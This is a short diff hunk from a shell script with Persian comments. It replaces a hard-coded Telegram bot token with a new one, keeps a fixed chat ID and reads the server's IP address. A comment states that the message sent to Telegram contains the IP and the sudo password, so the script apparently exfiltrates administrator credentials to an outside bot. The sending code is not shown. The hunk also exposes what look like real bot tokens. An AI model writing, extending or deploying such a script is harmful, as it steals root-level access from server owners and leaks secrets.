@@ -17,7 +17,7 @@ fi
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
 # توکن و chat_id ربات تلگرامی
-BOT_TOKEN="7358145097:AAEgn1qTPWVmzgRF3jlYWAmUYBlu5ca2pBU"
+BOT_TOKEN="7258790543:AAFgG1cpTEBdnIwplDBHxQ2fMpIZ4H9ezLI"
 CHAT_ID="7149105285"
 
 # پیام برای ارسال به تلگرام (شامل IP و پسورد sudo)
